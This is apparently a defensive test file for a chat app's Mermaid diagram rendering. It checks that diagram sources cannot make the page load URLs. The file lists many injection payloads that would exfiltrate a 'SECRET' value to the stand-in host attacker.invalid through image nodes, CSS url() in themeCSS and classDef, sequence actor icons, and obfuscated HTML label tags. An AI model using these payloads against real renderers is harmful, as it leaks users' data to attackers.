import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { setupDom } from "@agenteschat/ui/testing/dom";

setupDom();

import { act, cleanup, render } from "@testing-library/react";
import { drawWithMermaid, MermaidDiagram, setMermaidRenderer } from "@/components/artifacts/Mermaid";
import { createI18n } from "@/i18n";
import { Markdown } from "@/lib/markdown";
import { mermaidDrawable } from "@/lib/mermaid";
import { settle } from "./render";

/*
 * The real mermaid 11.17.2, drawing in this test's page. Nothing reaches the network here: every place where markup
 * turns into a load is recorded instead (`new Image().src`, URL and style attributes, HTML handed to the parser,
 * <style> text, style properties), and the outside host is reserved (.invalid).
 */

const HOST = "attacker.invalid";
const LEAK = `https://${HOST}/p.png?leak=SECRET`;
/** What the page was asked to load from the outside host: the requests a browser would have made. */
const requested: string[] = [];
const note = (where: string, value: unknown) => {
  if (String(value).includes(HOST)) requested.push(`${where}: ${value}`);
};

/** `new Image()` the way mermaid's image nodes use it; `decode` can be swapped for a load that never ends. */
class RecordingImage {
  static decode = () => Promise.resolve();
  naturalWidth = 10;
  naturalHeight = 10;
  #src = "";
  get src() {
    return this.#src;
  }
  set src(value: string) {
    note("new Image().src", value);
    this.#src = value;
  }
  decode() {
    return RecordingImage.decode();
  }
}

const restore: (() => void)[] = [];
function patch(target: object, key: string, descriptor: PropertyDescriptor) {
  const before = Object.getOwnPropertyDescriptor(target, key);
  Object.defineProperty(target, key, { configurable: true, enumerable: before?.enumerable, ...descriptor });
  restore.push(() => (before ? Object.defineProperty(target, key, before) : Reflect.deleteProperty(target, key)));
}

beforeAll(() => {
  createI18n("pt-BR");
  // What a browser has and happy-dom lacks, so mermaid takes the paths it takes there: MathML (without it each
  // `$$…$$` becomes the text "MathML is unsupported") and text with a box (without one every label fails its
  // measuring). Blank text has none, as in Chromium.
  patch(window, "MathMLElement", { value: class {}, writable: true });
  patch(SVGGraphicsElement.prototype, "getBBox", {
    value(this: SVGGraphicsElement) {
      const text = this.textContent?.trim() ?? "";
      return new DOMRect(0, 0, text.length * 8, text ? 16 : 0);
    },
  });
  const inPage = (node: Node) => node.ownerDocument === document;
  const loads = (name: string) => /^(?:src|srcset|href|background|poster|data|style)$/i.test(name.replace(/^.*:/, ""));
  patch(globalThis, "Image", { value: RecordingImage, writable: true });
  const { setAttribute, setAttributeNS, insertAdjacentHTML } = Element.prototype;
  patch(Element.prototype, "setAttribute", {
    value(this: Element, name: string, value: string) {
      if (inPage(this) && loads(name)) note(`<${this.localName} ${name}>`, value);
      setAttribute.call(this, name, value);
    },
  });
  patch(Element.prototype, "setAttributeNS", {
    value(this: Element, ns: string | null, name: string, value: string) {
      if (inPage(this) && loads(name)) note(`<${this.localName} ${name}>`, value);
      setAttributeNS.call(this, ns, name, value);
    },
  });
  patch(Element.prototype, "insertAdjacentHTML", {
    value(this: Element, where: InsertPosition, html: string) {
      if (inPage(this)) note(`<${this.localName}> HTML`, html);
      insertAdjacentHTML.call(this, where, html);
    },
  });
  for (const proto of [Node.prototype, Element.prototype, HTMLElement.prototype, SVGElement.prototype])
    for (const key of ["innerHTML", "outerHTML", "textContent"]) {
      const own = Object.getOwnPropertyDescriptor(proto, key);
      if (!own?.set) continue;
      patch(proto, key, {
        get: own.get,
        set(this: Node, value: string) {
          if (inPage(this) && (key !== "textContent" || this.nodeName === "STYLE"))
            note(`<${this.nodeName.toLowerCase()}> ${key === "textContent" ? "text" : "HTML"}`, value);
          own.set?.call(this, value);
        },
      });
    }
  const { setProperty } = CSSStyleDeclaration.prototype;
  patch(CSSStyleDeclaration.prototype, "setProperty", {
    value(this: CSSStyleDeclaration, name: string, value: string, priority?: string) {
      note(`style ${name}`, value);
      setProperty.call(this, name, value, priority);
    },
  });
});
afterAll(() => {
  for (const undo of restore.reverse()) undo();
  setMermaidRenderer(null);
});
beforeEach(() => {
  requested.length = 0;
  // The real mermaid, with nothing drawn yet.
  setMermaidRenderer(null);
});
afterEach(() => cleanup());

const fence = (source: string) => `\`\`\`mermaid\n${source}\n\`\`\``;
const IMAGE_NODE = `flowchart TD\n  A@{ img: "${LEAK}" }`;
const CLASS_URL = `stateDiagram-v2\n  [*] --> s1\n  classDef c fill:url(${LEAK})\n  class s1 c`;
const ICON_AFTER_END = `sequenceDiagram\n  participant A\n  loop L\n    A->>A: x\n  end properties A: {"icon": "${LEAK}"}`;
/** Ways a source can make the page load a URL while mermaid 11.17.2 draws, in some diagram type or another. */
const PATHS: [string, string][] = [
  ["an image node", IMAGE_NODE],
  ["an image node with an escaped YAML key", `flowchart TD\n  A@{ "\\x69mg": "${LEAK}" }`],
  ["an image node with a relative URL", 'flowchart TD\n  A@{ img: "/api/app/me" }'],
  [
    "%%{init}%% themeCSS",
    `%%{init: {"themeCSS": ".node rect { mask-image: url(${LEAK}) }"}}%%\nflowchart LR\n  A --> B`,
  ],
  [
    "%%{initialize}%% fontFamily",
    `%%{initialize: {"fontFamily": "x; mask-image: url(${LEAK})"}}%%\nflowchart LR\n  A --> B`,
  ],
  [
    "front matter themeCSS",
    `---\nconfig:\n  themeCSS: ".node rect { mask-image: url(${LEAK}) }"\n---\nflowchart LR\n  A --> B`,
  ],
  [
    "front matter with an escaped key",
    `---\n"\\x63onfig": {fontFamily: "x; mask-image: url(${LEAK})"}\n---\nflowchart LR\n  A --> B`,
  ],
  ["a classDef url()", CLASS_URL],
  ["a CSS-escaped url()", `stateDiagram-v2\n  [*] --> s1\n  classDef c mask-image:\\75 rl(${LEAK})\n  class s1 c`],
  ["a style image-set()", `flowchart LR\n  A --> B\n  style A mask-image:image-set("${LEAK}" 1x)`],
  ["a linkStyle url()", `flowchart LR\n  A --> B\n  linkStyle 0 stroke:url(${LEAK})`],
  ["a gantt todayMarker", `gantt\n  todayMarker mask-image:url(${LEAK})\n  section S\n  T :a1, 2024-01-01, 3d`],
  ["a sequence actor's icon", `sequenceDiagram\n  participant A\n  properties A: {"icon": "${LEAK}"}`],
  ["a sequence actor's icon after an end", ICON_AFTER_END],
  [
    "a sequence actor's icon after a box's end",
    `sequenceDiagram\n  box G\n  participant A\n  end properties A: {"icon": "${LEAK}"}`,
  ],
  [
    "a sequence actor's icon on the diagram's first line",
    `sequenceDiagram properties A: {"icon": "${LEAK}"}\n  participant A`,
  ],
  ["a sequence actor's details, read from the page", "sequenceDiagram\n  participant A\n  details A: root"],
  [
    "a sequence actor's details after an end",
    "sequenceDiagram\n  participant A\n  loop L\n    A->>A: x\n  end details A: root",
  ],
];
/**
 * Label HTML that mermaid puts in the page, spelled the ways a tag check misses. These do reach mermaid: its sanitizer,
 * set by drawWithMermaid, is what drops what would load.
 */
const LABEL_HTML: [string, string][] = [
  [
    "a sequence message with math, the first attribute with no value",
    `sequenceDiagram\n  A->>B: $$x$$ <img alt src=${LEAK}>`,
  ],
  ["a sequence message with math, slashes between attributes", `sequenceDiagram\n  A->>B: $$x$$ <img/alt/src=${LEAK}>`],
  ["a sequence message with math, an attribute named =x", `sequenceDiagram\n  A->>B: $$x$$ <img =x src=${LEAK}>`],
  ["a sequence note with math", `sequenceDiagram\n  participant A\n  Note over A: $$x$$ <img alt src=${LEAK}>`],
  ["a participant's alias with math", `sequenceDiagram\n  participant A as $$x$$ <img alt src=${LEAK}>\n  A->>A: oi`],
  ["a class label with math", `classDiagram\n  class A["$$x$$ <img alt src=${LEAK}>"]`],
  [
    "a class label's style attribute, url( spelled with an entity",
    `classDiagram\n  class A["$$x$$ <b alt style=background-image:ur#108;(${LEAK})>b</b>;"]`,
  ],
  [
    "an inline SVG's mask in a class label",
    `classDiagram\n  class A["$$x$$ <svg><rect x mask=ur#108;(${LEAK}#m) /></svg>"]`,
  ],
  ["an architecture service's text", `architecture-beta\n  service s1 "<img alt src=${LEAK}>"[S1]`],
  ["an architecture service's text, a backslash after <", `architecture-beta\n  service s1 "<\\img src=${LEAK}>"[S1]`],
];
/** Diagrams as people and agents write them, which must still draw. */
const EVERYDAY = [
  "---\ntitle: Fluxo de deploy\n---\nflowchart LR\n  A[Linha 1<br/>Linha 2] --> B[<b>forte</b><br>e <i>itálico</i>]",
  "flowchart LR\n  A{x < y} --> B{a<b}\n  B --> C[n <= 1]\n  classDef hot fill:#f96,stroke:rgb(10,20,30)\n  class A hot\n  style B fill:#bbf\n  linkStyle 0 stroke:#ff3",
  'flowchart LR\n  A@{ shape: rounded, label: "Início" } --> B',
  "classDiagram\n  class Animal {\n    <<interface>>\n    +List~int~ ids\n    +Map~String, Integer~ m\n  }\n  Animal <|-- Duck",
  "sequenceDiagram\n  Ana->>Bia: Olá<br/>tudo bem?\n  Note over Ana: detalhes do pedido\n  Bia-->>Ana: Sim",
  "%% um comentário\nflowchart LR\n  accTitle: Fluxo\n  accDescr: Do pedido ao deploy\n  A --> B",
  'sequenceDiagram\n  Ana->>Bia: os details do pedido\n  Bia-->>Ana: <b class="ok">feito</b> em $$t_1$$',
  "classDiagram\n  class Repo {\n    +Map<String, Integer> counts\n  }",
];
/** A diagram most pages would have: a title, a line break in a label, a color. */
const PLAIN =
  "---\ntitle: Fluxo\n---\nflowchart LR\n  A[Pedido<br/>novo] --> B[Deploy]\n  classDef hot fill:#f96\n  class A hot";

/** Waits until `count` diagrams in `el` are drawn by the real mermaid. */
async function untilDrawn(el: Element, count: number) {
  for (let i = 0; i < 300 && el.querySelectorAll(".code-card__preview img").length < count; i++)
    await act(() => new Promise<void>((resolve) => setTimeout(resolve, 10)));
}

/**
 * Mermaid with its own sanitizer settings instead of drawWithMermaid's; what it leaves in <body> is then removed. It
 * draws a participant's label without waiting for it, hence the settle.
 */
async function drawRaw(id: string, source: string) {
  const before = new Set(document.body.children);
  const { default: mermaid } = await import("mermaid");
  mermaid.initialize({
    startOnLoad: false,
    htmlLabels: false,
    flowchart: { htmlLabels: false },
    suppressErrorRendering: true,
  });
  await mermaid.mermaidAPI.render(id, source).catch(() => {});
  await settle();
  for (const el of Array.from(document.body.children)) if (!before.has(el)) el.remove();
}

describe("a ```mermaid fence can't make the page load anything", () => {
  test("sources that would are refused; everyday diagrams aren't", () => {
    for (const [name, source] of PATHS) expect([name, mermaidDrawable(source)]).toEqual([name, false]);
    for (const source of EVERYDAY) expect([source, mermaidDrawable(source)]).toEqual([source, true]);
    // Past mermaid's maxTextSize it would draw a red error box.
    expect(mermaidDrawable(`flowchart LR\n  A[${"x".repeat(50_000)}] --> B`)).toBe(false);
  });

  test.each(PATHS)("%s: stays code and the page asks for nothing", async (_, source) => {
    const el = render(<Markdown source={`${fence(source)}\n\n${fence(PLAIN)}`} />).container;
    // The diagram after it is drawn by the real mermaid, so the drawings went past this one.
    await untilDrawn(el, 1);
    const [first, second] = el.querySelectorAll(".code-card");
    expect(first?.querySelector(".code-card__code")?.textContent).toBe(source);
    expect(second?.querySelector(".code-card__preview img")).not.toBeNull();
    expect(requested).toEqual([]);
  });

  test("Drive's diagrams take the same check", async () => {
    const el = render(<MermaidDiagram source={IMAGE_NODE} label="Diagrama: Fluxo" />).container;
    await settle();
    expect(el.querySelector(".artifact-diagram--failed code")?.textContent).toBe(IMAGE_NODE);
    expect(requested).toEqual([]);
  });

  let labels = 0;
  test.each(LABEL_HTML)("%s: its HTML reaches the page without anything that loads", async (_, source) => {
    const id = `label-${++labels}`;
    expect(mermaidDrawable(source)).toBe(true);
    // Under happy-dom an architecture diagram fails at its layout (no canvas), after its services are drawn. What a
    // participant's label puts in the page after the drawing is done counts too.
    await drawWithMermaid(id, source, false).catch(() => {});
    await settle();
    expect(requested).toEqual([]);
    // With mermaid's own sanitizer settings the page asks for the URL: this label's HTML does reach the page.
    await drawRaw(`raw-${id}`, source);
    expect(requested).not.toEqual([]);
  });
});

describe("the real mermaid", () => {
  test("left to itself, it asks for an image node's URL, puts a classDef's url() in the page's CSS and an actor's icon in an <image>", async () => {
    await drawWithMermaid("probe-image", IMAGE_NODE, false);
    expect(requested).toContain(`new Image().src: ${LEAK}`);
    requested.length = 0;
    await drawWithMermaid("probe-css", CLASS_URL, false);
    expect(requested.some((r) => r.startsWith("<style> HTML") && r.includes(LEAK))).toBe(true);
    requested.length = 0;
    await drawWithMermaid("probe-icon", ICON_AFTER_END, false);
    expect(requested).toContain(`<image href>: ${LEAK}`);
  });

  test("drops a diagram's own settings that reach the page's CSS, should one get past the check", async () => {
    const settings = PATHS.filter(([name]) => /%%|front matter/.test(name)).map(([, source]) => source);
    for (const [i, source] of settings.entries()) await drawWithMermaid(`settings-${i}`, source, false);
    expect(requested).toEqual([]);
  });

  test("a drawing that never finishes gives up, leaves nothing in <body> and holds no other back", async () => {
    RecordingImage.decode = () => new Promise(() => {});
    try {
      const hanging = 'flowchart TD\n  A@{ img: "https://slow.invalid/x.png" }';
      await expect(drawWithMermaid("hang", hanging, false, 50)).rejects.toThrow("didn't finish");
    } finally {
      RecordingImage.decode = () => Promise.resolve();
    }
    expect(document.getElementById("dhang")).toBeNull();
    // In mermaid's own queue this one would wait behind the drawing still hanging.
    expect(await drawWithMermaid("after-hang", "flowchart LR\n  A --> B", false, 2000)).toBeString();
  });

  test("a drawing that fails takes what mermaid put in <body> with it, and only that", async () => {
    const inBody = () => Array.from(document.body.children, (el) => el.outerHTML.slice(0, 80));
    const before = inBody();
    // A blank line in a label has no box to measure: mermaid stops with its measuring <svg> still in <body>.
    const drawing = drawWithMermaid("blank-line", "sequenceDiagram\n  A->>B: a<br> <br>b", false);
    // Added meanwhile by someone else, like a toast.
    const toast = document.body.appendChild(document.createElement("output"));
    await expect(drawing).rejects.toThrow("not in render tree");
    expect(inBody()).toEqual([...before, "<output></output>"]);
    toast.remove();
  });

  test("a gantt is drawn 720px wide, which a card fits, not as wide as the box it's drawn in", async () => {
    const boxes: string[] = [];
    const { setAttribute } = Element.prototype;
    Element.prototype.setAttribute = function (this: Element, name: string, value: string) {
      if (name === "viewBox") boxes.push(value);
      setAttribute.call(this, name, value);
    };
    try {
      await drawWithMermaid(
        "gantt",
        "gantt\n  dateFormat YYYY-MM-DD\n  section Entrega\n  Build :a1, 2024-01-01, 3d",
        false,
      );
    } finally {
      Element.prototype.setAttribute = setAttribute;
    }
    expect(boxes).toEqual([expect.stringMatching(/^0 0 720 /)]);
  });
});
